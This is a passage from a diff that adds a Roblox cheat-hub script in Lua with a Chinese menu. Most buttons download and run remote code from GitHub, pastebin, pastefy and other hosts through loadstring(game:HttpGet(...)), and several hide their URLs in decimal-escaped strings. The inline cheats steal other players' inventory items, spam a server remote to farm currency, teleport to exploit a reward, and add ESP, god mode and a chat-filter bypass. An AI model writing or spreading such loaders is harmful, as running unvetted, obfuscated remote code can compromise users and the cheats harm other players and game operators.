+                    nameLabel.Parent = billboard
+                    nameLabel.Size = UDim2.new(1, 0, 1, 0)
+                    nameLabel.BackgroundTransparency = 1
+                    nameLabel.Text = player.Name
+                    nameLabel.TextColor3 = Color3.new(1, 1, 1)
+                    nameLabel.TextStrokeTransparency = 0.5
+                    nameLabel.TextScaled = true
+
+                    local circle = Instance.new("ImageLabel")
+                    circle.Parent = billboard
+                    circle.Size = UDim2.new(0, 50, 0, 50)
+                    circle.Position = UDim2.new(0.5, 0, 0.5, 0)
+                    circle.AnchorPoint = Vector2.new(0.5, 0.5)
+                    circle.BackgroundTransparency = 1
+                    circle.Image = "rbxassetid://2200552246"
+                else
+                    if player.Character:FindFirstChildOfClass("Highlight") then
+                        player.Character:FindFirstChildOfClass("Highlight"):Destroy()
+                    end
+                    if player.Character:FindFirstChildOfClass("BillboardGui") then
+                        player.Character:FindFirstChildOfClass("BillboardGui"):Destroy()
+                    end
+                end
+            end
+        end
+    end)
+end)
+
+Button(Tab2, "建筑工具", function()
+    pcall(function()
+        		Hammer = Instance.new("HopperBin")
+		Hammer.Name = "锤子"
+		Hammer.BinType = 4
+		Hammer.Parent = game.Players.LocalPlayer.Backpack
+		Clone = Instance.new("HopperBin")
+		Clone.Name = "克隆"
+		Clone.BinType = 3
+		Clone.Parent = game.Players.LocalPlayer.Backpack
+		Grab = Instance.new("HopperBin")
+		Grab.Name = "抓取"
+		Grab.BinType = 2
+    end)
+end)
+
+Button(Tab2, "奖励自己", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/minecrafttotem/yzhs./main/Fe%20pp%20script%20very%20fun"))()
+    end)
+end)
+
+-- 通用2 (Tab3)
+Button(Tab3, "工具挂", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Bebo-Mods/BeboScripts/main/StandAwekening.lua"))()
+    end)
+end)
+
+Button(Tab3, "电脑键盘", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))() 
+    end)
+end)
+
+Button(Tab3, "死亡笔记", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))()
+    end)
+end)
+
+Button(Tab3, "阿尔宙斯V3.0 UI", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
+    end)
+end)
+
+Button(Tab3, "撸鸡r6", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
+    end)
+end)
+
+Button(Tab3, "撸鸡R15", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+    end)
+end)
+
+Button(Tab3, "隐身", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Invisible-35376"))()
+    end)
+end)
+
+Button(Tab3, "上帝模式", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main",true))()
+    end)
+end)
+
+Button(Tab3, "r15变r6", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-R6-Animations-on-R15-16865"))()
+    end)
+end)
+
+Button(Tab3, "聊天绕过", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/BingusWR/Fechatbypassroblox/refs/heads/main/Fe%20Roblox%20ChatBypass"))()
+    end)
+end)
+
+Button(Tab3, "聊天框画画脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ocfi/_/refs/heads/main/a"))()
+    end)
+end)
+
+Button(Tab3, "偷别人物品栏道具", function()
+    pcall(function()
+    --Copy And Paste:
+for i,v in pairs (game.Players:GetChildren()) do
+wait()
+for i,b in pairs (v.Backpack:GetChildren()) do
+b.Parent = game.Players.LocalPlayer.Backpack
+end
+end
+    end)
+end)
+
+Button(Tab3, "超广角设置", function()
+    pcall(function()
+		Workspace.CurrentCamera.FieldOfView = Value
+    end)
+end)
+
+Button(Tab3, "自动弹钢琴", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Tac's-Piano-Stuff-Talentless-script-made-by-hellohellohell012321-44088"))()
+    end)
+end)
+
+Button(Tab3, "伪VP", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty45.lua"))()
+    end)
+end)
+
+-- 各大脚本 (Tab4)
+Button(Tab4, "Xi脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
+    end)
+end)
+
+Button(Tab4, "黄某脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaokong6/x1/refs/heads/main/黄某脚本加载器"))()
+    end)
+end)
+
+Button(Tab4, "AQ脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/SUNXIAOCHUAN886/AQ/refs/heads/main/AQ"))()
+    end)
+end)
+
+Button(Tab4, "BS脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://gitlab.com/ajduoxcz/bs-center-of-the-black-hole/-/raw/main/BS%20Center%20of%20the%20black%20hole"))()
+    end)
+end)
+
+Button(Tab4, "叶脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-CNVIP-XIAOYE.lua"))()
+    end)
+end)
+
+Button(Tab4, "皮脚本", function()
+    pcall(function()
+    getgenv().XiaoPi="皮脚本QQ群1002100032" loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaopi77/xiaopi77/main/QQ1002100032-Roblox-Pi-script.lua"))()
+    end)
+end)
+
+Button(Tab4, "落叶脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
+    end)
+end)
+
+Button(Tab4, "CDID脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-YESCRIPT-CDID.lua"))()
+    end)
+end)
+
+Button(Tab4, "kanl脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/dream77239/kanl/refs/heads/main/Kanl%E8%84%9A%E6%9C%AC"))()
+    end)
+end)
+
+Button(Tab4, "LG脚本", function()
+    pcall(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\117\115\101\114\97\110\101\119\114\102\102\47\114\111\98\108\111\120\45\47\109\97\105\110\47\37\69\54\37\57\68\37\65\49\37\69\54\37\65\67\37\66\69\37\69\53\37\56\68\37\56\70\37\69\56\37\65\69\37\65\69\34\41\41\40\41\10")()
+    end)
+end)
+
+Button(Tab4, "lSlS脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/S-WTB/-/refs/heads/main/ISIS加载器'))()
+    end)
+end)
+
+Button(Tab4, "MP中心", function()
+    pcall(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\77\80\48\48\78\47\77\80\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\75\105\110\103\46\108\117\97\34\41\41\40\41")()
+    end)
+end)
+
+Button(Tab4, "NOL免费版", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Syndromehsh/BETA2/refs/heads/main/NOL"))()
+    end)
+end)
+
+Button(Tab4, "Roblox脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/HT-DJ/htdjsq/main/%E6%96%87%E4%BB%B6/Script/HT-DJ%20Roblox.lua'))()
+    end)
+end)
+
+Button(Tab4, "SN中心", function()
+    pcall(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\120\105\97\110\105\110\103\49\53\49\47\83\78\72\85\66\47\109\97\105\110\47\83\78\104\117\98\46\108\117\97\34\41\41\40\41")()
+    end)
+end)
+
+Button(Tab4, "Xi脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
+    end)
+end)
+
+Button(Tab4, "XC脚本中心", function()
+    pcall(function()
+    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
+    end)
+end)
+
+Button(Tab4, "XK脚本中心", function()
+    pcall(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\66\73\78\106\105\97\111\98\122\120\54\47\66\73\78\106\105\97\111\47\109\97\105\110\47\88\75\46\84\88\84\34\41\41\40\41\10")()
+    end)
+end)
+
+Button(Tab4, "XP脚本（卡密：爱吃78的xp", function()
+    pcall(function()
+    loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\110\100\097\100\101\118\101\108\111\112\109\101\110\116\046\110\101\116\047\118\105\114\116\117\097\108\047\102\105\108\101\047\055\052\101\053\053\049\049\102\054\051\102\099\050\049\052\054"))()
+    end)
+end)
+
+Button(Tab4, "X脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/maowang1/xx/refs/heads/main/Protected_8858329470146381.txt"))()
+    end)
+end)
+
+Button(Tab4, "yba脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet"https://raw.githubusercontent.com/NukeVsCity/hackscript123/main/gui")()
+    end)
+end)
+
+Button(Tab4, "Z脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ZiO9178/jb/refs/heads/main/ZiO.lua"))()
+    end)
+end)
+
+Button(Tab4, "白沫脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaobai0744/-/refs/heads/main/%E7%99%BD%E6%B2%AB%E8%84%9A%E6%9C%AC%E6%BA%90(1).lua"))()
+    end)
+end)
+
+Button(Tab4, "北约中心", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/USA868/114514-55-646-114514-88-61518-618-840-1018-634-10-4949-3457578401-615/main/Protected-36.lua"))()
+    end)
+end)
+
+Button(Tab4, "辞瞄脚本.", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/SpinnyMemer/Gravity-Hub/refs/heads/main/ArsenalMobile.lua'))()
+    end)
+end)
+
+-- FE (Tab5)
+Button(Tab5, "爬行", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/0Ben1/fe/main/obf_vZDX8j5ggfAf58QhdJ59BVEmF6nmZgq4Mcjt2l8wn16CiStIW2P6EkNc605qv9K4.lua.txt'))()
+    end)
+end)
+
+Button(Tab5, "FE R15动画", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FengYu-3/general/refs/heads/main/FE_R15.lua"))()
+    end)
+end)
+
+Button(Tab5, "FE地精.", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rTvXTs8F16D8D2oiLxZ62E1E9jT1we312yUyJr2h72Vwqr32l37rirU1S89hqRV7.lua.txt"))()
+    end)
+end)
+
+Button(Tab5, "FE大运", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/3LD4D0/Crazy-Man-R6/36ec60d16bf8d208c40807aa0fd2662af76a5385/Crazy%20Man%20R6"))()
+    end)
+end)
+
+Button(Tab5, "FE方块", function()
+    pcall(function()
+    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\50\66\120\90\69\83\109\106\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
+    end)
+end)
+
+Button(Tab5, "FE狒狒", function()
+    pcall(function()
+    loadstring(game:HttpGet(('https://pastefy.ga/osEThPw1/raw'),true))()
+    end)
+end)
+
+Button(Tab5, "FE假延迟", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RENZXW/RENZXW-SCRIPTS/main/fakeLAGRENZXW.txt"))()
+    end)
+end)
+
+Button(Tab5, "FE燃尽脚本.", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/DROID-cell-sys/ANTI-UTTP-SCRIPTT/refs/heads/main/EGOR%20SCRIPT%20BY%20ANTI-UTTP"))()
+    end)
+end)
+
+Button(Tab5, "FE杀手", function()
+    pcall(function()
+    loadstring(game:HttpGet(('https://pastefy.ga/d7sogwNS/raw'),true))()
+    end)
+end)
+
+Button(Tab5, "FE舞蹈（超级多）", function()
+    pcall(function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/Gazer-Ha/Free-emote/refs/heads/main/Delta%20mad%20stuffs"))()
+    end)
+end)
+
+Button(Tab5, "FE变大变小（有些服务器用不了）", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/tfcygvunbind/Apple/492dc6092ca66e8de1ed30a7ce8880c12f05c1e6/%EF%BC%9F%EF%BC%81%EF%BC%9F%EF%BC%81"))()
+    end)
+end)
+
+-- DOORS功能 (Tab6)
+Button(Tab6, "门", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://github.com/DocYogurt/free/raw/main/long"))()
+    end)
+end)
+
+Button(Tab6, "Poop doors", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/mstudio45/poopdoors_edited/main/poopdoors_edited.lua"))()
+    end)
+end)
+
+Button(Tab6, "穿墙(无拉回)", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
+    end)
+end)
+
+Button(Tab6, "变身(阿巴怪提供)", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))()
+    end)
+end)
+
+Button(Tab6, "剪刀", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/shears_done.lua"))()
+    end)
+end)
+
+Button(Tab6, "MS", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/notpoiu/mspaint/main/main.lua"))()
+    end)
+end)
+
+Button(Tab6, "十字架", function()
+    pcall(function()
+        loadstring(game:HttpGet('https://gist.githubusercontent.com/C00LBOZO/0c78ad8c74ca26324c87ede16ce8b387/raw/c0887ac0d24fde80bea11ab1a6a696ec296af272/Crucifix'))()
+    end)
+end)
+
+Button(Tab6, "吸铁石", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MrNeRD0/Doors-Hack/main/MagnetByNerd.lua"))()
+    end)
+end)
+
+Button(Tab6, "激光枪", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Laser%20Gun"))()
+    end)
+end)
+
+Button(Tab6, "能量罐（清岩提供）", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
+    end)
+end)
+
+Button(Tab6, "紫色手电筒（在电梯购买东西的时候使用）", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight"))()
+    end)
+end)
+
+Button(Tab6, "刷怪菜单", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shuaguai"))()
+    end)
+end)
+
+Button(Tab6, "DOORS变身脚本", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))()
+    end)
+end)
+
+Button(Tab6, "耶稣十字架", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi2"))()
+    end)
+end)
+
+Button(Tab6, "紫光十字架", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi3"))()
+    end)
+end)
+
+Button(Tab6, "万圣节十字架", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizi4"))()
+    end)
+end)
+
+Button(Tab6, "普通十字架", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/shizizhen"))()
+    end)
+end)
+
+-- rooms&doors (Tab7)
+Button(Tab7, "rooms&doors", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms%20%26%20Doors"))()
+    end)
+end)
+
+Button(Tab7, "rooms同人服务器", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ChinaQY/Scripts/Main/Rooms"))()
+    end)
+end)
+
+-- 压力,doors (Tab8)
+Button(Tab8, "最强doors & 压力", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://github.com/Drop56796/CreepyEyeHub/blob/main/obfuscate.lua?raw=true"))()
+    end)
+end)
+
+-- 动感星期五 (Tab9)
+Button(Tab9, "动感星期五1", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://rawscripts.net/raw/Funky-Friday-Fire-Hub-18850"))()
+    end)
+end)
+
+Button(Tab9, "动感星期五2", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/Skedzz/ScriptHub/main/Loader"))()
+    end)
+end)
+
+Button(Tab9, "动感星期五3", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()   
+    end)
+end)
+
+Button(Tab9, "动感星期五4", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/MariyaFurmanova/Library/main/WarTycoon", true))() 
+    end)
+end)
+
+-- 压力 (Tab10)
+Button(Tab10, "NB", function()
+    pcall(function()
+        loadstring(game:HttpGet('https://github.com/DocYogurt/Main/raw/main/Scripts/Pressure'))()
+    end)
+end)
+
+Button(Tab10, "压力！！！", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/ohiojjj/78/main/.github/workflows/Protected_5509067665689579.lua'))()
+    end)
+end)
+
+Button(Tab10, "压力脚本", function()
+    pcall(function()
+    getgenv().lishichuan="1001390385" loadstring(game:HttpGet("https://pastebin.com/raw/iZuasZCc"))()
+    end)
+end)
+
+-- 成为乞丐 (Tab11)
+Button(Tab11, "刷钱", function()
+    pcall(function()
+         -- services --
+
+local runService = game:GetService("RunService")
+local players = game:GetService("Players")
+local localPlayer = players.LocalPlayer
+local character = localPlayer.Character or localPlayer.CharacterAdded:Wait()
+-- utils --
+function findfirstchild(parent, childName)
+return parent and parent:FindFirstChild(childName)
+end
+function findfirstchildwhichisa(parent, childName)
+return parent and parent:FindFirstChildWhichIsA(childName)
+end
+-- objects --
+local basesFolder = findfirstchild(workspace, "Bases")
+-- table(s) --
+local data = {
+myBase = nil,
+begPrompt = nil,
+basePrompt = nil,
+}
+-- main code --
+for _, base in ipairs(basesFolder:GetChildren()) do
+if not base then continue end
+local owner = findfirstchild(base, "Owner")
+if not owner or owner.Value ~= localPlayer then continue end
+data.myBase = base
+local begPrompt = findfirstchild(base, "BegPrompt")
+if not begPrompt then continue end
+data.begPrompt = begPrompt
+local basePrompt = findfirstchildwhichisa(begPrompt, "ProximityPrompt")
+data.basePrompt = basePrompt
+break
+end
+local hrp = findfirstchild(character, "HumanoidRootPart")
+if hrp then
+hrp.CFrame = data.begPrompt.CFrame
+fireproximityprompt(data.basePrompt)
+end
+if cashConnection then
+cashConnection:Disconnect()
+cashConnection = nil
+end
+getgenv().cashConnection = runService.Heartbeat:Connect(function()
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("MinigameEvent"):FireServer(true)
+end)
+    end)
+end)
+
+-- 磁铁模拟器 (Tab12)
+Button(Tab12, "自动收集硬币", function()
+    pcall(function()
+         loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/b.lua", true))()
+    end)
+end)
+
+-- 建造一架飞机 (Tab13）
+Button(Tab13, "一次2600万左右", function()
+    pcall(function()
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Players = game:GetService("Players")
+
+local LaunchRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Launch")
+local ReturnRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("LaunchEvents"):WaitForChild("Return")
+
+local player = Players.LocalPlayer
+local character = player.Character or player.CharacterAdded:Wait()
+
+LaunchRemote:FireServer()
+
+task.wait(1)
+
+character:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(9000000000e9, 90000000000e9, 9000000000e9)
+
+task.wait(1)
+
+ReturnRemote:FireServer()
+
+    end)
+end)
+
+-- 勘探中 (Tab14)
+Button(Tab14, "勘探中脚本1", function()
+    pcall(function()
+     loadstring(game:HttpGet("https://raw.githubusercontent.com/gumanba/Scripts/refs/heads/main/Prospecting", true))()
+    end)
+end)
+
+-- 法宝模拟器 (Tab15)
+Button(Tab15, "法宝模拟器1（会覆盖）", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/FreeRobloxScripts/anime-fighting/main/simulator"))()
+    end)
+end)
+
+-- 在披萨店工作 (Tab16)
+Button(Tab16, "在披萨店工作", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://github.com/CloudX-ScriptsWane/ScriptsDache/raw/main/披萨店工作.luau", true))()
+    end)
+end)
+
+-- 战斗勇士 (Tab17)
+Button(Tab17, "老外杀人脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IsaaaKK/cwhb/main/cw.txt"))()
+    end)
+end)
+
+-- 一次尘土的旅行 (Tab18)
+Button(Tab18, "老外牛逼脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://scriptblox.com/raw/a-dusty-trip-FREE-CAR-Gui-14352"))()
+    end)
+end)
+
+-- 破坏者谜团2 (Tab19)
+Button(Tab19, "破坏者谜团2", function()
+    pcall(function()
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/Script"),true))()  
+    end)
+end)
+
+Button(Tab19, "透视身份", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESP"))(' Watermelon ?')
+    end)
+end)
+
+-- 模仿者 (Tab20)
+Button(Tab20, "模仿者1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ttjy9808/obfloadstringmainmimic/main/README.md", true))()
+    end)
+end)
+
+-- 火箭发射模拟器 (Tab21)
+Button(Tab21, "火箭发射模拟器1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://ayangwp.cn/api/v3/file/get/9245/%E7%8C%AB%E9%80%9A%E7%94%A8.txt?sign=hrWROZdVfK2mtJcIFa3Tvbl-TojP1C86_Zd3q03qttc%3D%3A0"))()
+        end)
+end)
+
+-- 只因剑 (Tab22)
+Button(Tab22, "只因剑1", function()
+    pcall(function()
+     loadstring(game:HttpGet(('https://gist.githubusercontent.com/blox-hub-roblox/021bad62bbc6a0adc4ba4e625f9ad7df/raw/c89af6e1acf587d09e4ce4bc7510e7100e0c0065/swordWarrior.lua'),true))()
+        end)
+end)
+
+-- 森林里的99夜 (Tab23)
+Button(Tab23, "二狗子脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/gycgchgyfytdttr/shenqin/refs/heads/main/99day.lua"))()
+    end)
+end)
+
+Button(Tab23, "虚空脚本Kenny汉化", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ke9460394-dot/ugik/refs/heads/main/99%E5%A4%9C%E8%99%9A%E7%A9%BA.txt"))()
+    end)
+end)
+
+Button(Tab23, "自动刷钻石3.0", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Rezexis/Main-Lua/refs/heads/main/Loader.lua"))()
+    end)
+end)
+
+Button(Tab23, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/VW-Add/main/nightsintheforest.lua", true))()
+    end)
+end)
+
+Button(Tab23, "脚本2", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/99-Nights-in-the-Forest-99-NITF-KEYLESS-SCRIPT-48729"))()
+    end)
+end)
+
+Button(Tab23, "脚本三", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Xingtaiduan/Script/refs/heads/main/Games/森林中的99夜.lua"))()
+    end)
+end)
+
+Button(Tab23, "汉化脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/atnew2025/99dayinLEIDIAN/refs/heads/main/99夜汉化小本.txt"))()
+    end)
+end)
+
+Button(Tab23, "汉化脚本二", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/358545698555/roblox-/refs/heads/main/%E5%8F%AF%E6%9D%80%E9%98%9F%E5%8F%8B99%E5%A4%9C"))()
+    end)
+end)
+-- 旗帜战争 (Tab24)
+Button(Tab24, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Infinity2346/Tect-Menu/main/Flag%20Wars.txt'))()  
+    end)
+end)
+
+-- 逃出建筑 (Tab25)
+Button(Tab25, "脚本一", function()
+    pcall(function()
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/rblxscriptsnet/unfair/main/rblxhub.lua'),true))()
+    end)
+end)
+
+-- 打墙模拟器 (Tab26)
+Button(Tab26, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JunBloxYTPlayz/SORIX-Hub/main/Punch%20Wall%20Simulator"))();
+    end)
+end)
+
+-- 生存巨人 (Tab27)
+Button(Tab27, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/RiseValco/scripts/main/GiantSurvival.lua"))()
+    end)
+end)
+
+-- 健身房之星模拟器 (Tab28)
+Button(Tab28, "脚本1", function()
+    pcall(function()
+        loadstring(game:HttpGet("https://github.com/xiaoSB33/M416/raw/main/v.lua", true))()
+    end)
+end)
+
+-- 死铁轨 (Tab29)
+Button(Tab29, "刷债券1", function()
+    pcall(function()
+    --[[by 退休不退休]]QUN = "160369111"TX = "退休脚本"script = "死铁轨免费刷债券"BY = "退休"loadstring(game:HttpGet("https://raw.githubusercontent.com/JsYb666/Item/refs/heads/main/%E5%88%B7%E5%80%BA%E5%88%B8"))()
+    end)
+end)
+
+Button(Tab29, "刷债券2", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/thantzy/thanhub/refs/heads/main/thanv1"))()
+    end)
+end)
+
+Button(Tab29, "找闪电马脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/wehjf/famineringta.github.io/refs/heads/main/horseringta.lua"))()
+    end)
+end)
+
+Button(Tab29, "找岩浆马脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/fjruie/Warhorse.github.io/refs/heads/main/ringta.lua"))()
+    end)
+end)
+
+Button(Tab29, "攻速脚本", function()
+    pcall(function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/DeadRails/refs/heads/main/V5OPSWING"))()   
+    end)
+end)
+
+Button(Tab29, "传送脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/badass1ia/Merciful/refs/heads/main/Absurdity111"))()
+    end)
+end)
+
+Button(Tab29, "红叶脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://getnative.cc/script/loader"))()
+    end)
+end)
+
+Button(Tab29, "焊接脚本", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/HeadHarse/Dusty/refs/heads/main/WeldObject"))()
+    end)
+end)
+
+Button(Tab29, "脚本1", function()
+    pcall(function()
+    loadstring(game:HttpGet('https://pastefy.app/7vZN3EwV/raw'))()
+    end)
+end)
+
+Button(Tab29, "脚本2", function()
+    pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Unknownlodfc/Zephyr/refs/heads/main/DeadRails/Main"))()
+    end)
+end)
+
+-- 墨水游戏 (Tab30)
+Button(Tab30, "oP脚本", function()
+    pcall(function()
